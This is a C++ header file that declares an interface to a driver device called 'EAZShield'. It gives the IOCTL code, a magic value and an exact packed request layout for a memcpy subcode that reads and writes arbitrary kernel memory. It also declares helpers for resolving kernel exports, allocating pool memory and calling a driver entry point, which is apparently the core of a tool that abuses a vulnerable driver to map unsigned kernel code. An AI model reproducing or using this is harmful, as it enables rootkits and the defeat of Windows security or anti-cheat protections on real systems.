#pragma once
#include <Windows.h>
#include <winternl.h>
#include <cstdint>
#include <vector>

#define SHIELD_DEVICE_NAME    L"\\\\.\\EAZShield"
#define SHIELD_IOCTL_CODE     0x96102014
#define SHIELD_MAGIC          0x444D4377
#define SHIELD_SUBCODE_MEMCPY 0xf0016

#pragma pack(push, 1)
struct SHIELD_REQUEST {
    uint32_t header[1];       // 0x00 .. 0x03
    uint32_t magic;           // 0x04: 0x444D4377
    uint32_t subcode;         // 0x08: 0xf0016
    uint8_t  padding_1[52];   // 0x0C .. 0x3F (52 bytes)
    uint32_t direction;       // 0x40: 0 = write to kernel, 1 = read from kernel
    uint32_t size;            // 0x44: bytes count
    uint64_t kernel_address;  // 0x48: kernel target address
    uint8_t  buffer[1024];    // 0x50: data buffer
};
#pragma pack(pop)

static_assert(offsetof(SHIELD_REQUEST, magic) == 0x04, "magic offset error");
static_assert(offsetof(SHIELD_REQUEST, subcode) == 0x08, "subcode offset error");
static_assert(offsetof(SHIELD_REQUEST, direction) == 0x40, "direction offset error");
static_assert(offsetof(SHIELD_REQUEST, size) == 0x44, "size offset error");
static_assert(offsetof(SHIELD_REQUEST, kernel_address) == 0x48, "kernel_address offset error");
static_assert(offsetof(SHIELD_REQUEST, buffer) == 0x50, "buffer offset error");

namespace ShieldDriver {

    HANDLE  Open();
    void    Close(HANDLE hDevice);

    bool    ReadKernel(HANDLE hDevice, uint64_t kernelAddr, void* userBuf, uint64_t size);
    bool    WriteKernel(HANDLE hDevice, uint64_t kernelAddr, const void* userBuf, uint64_t size);

    uint64_t GetNtoskrnlBase();
    uint64_t GetKernelModuleBase(const char* moduleName);
    uint64_t GetKernelExport(HANDLE hDevice, uint64_t moduleBase, const char* funcName);

    uint64_t AllocatePool(HANDLE hDevice, uint64_t size);
    bool     FreePool(HANDLE hDevice, uint64_t address);

    bool     CallDriverEntry(HANDLE hDevice, uint64_t entryPoint, uint64_t driverBase);
}
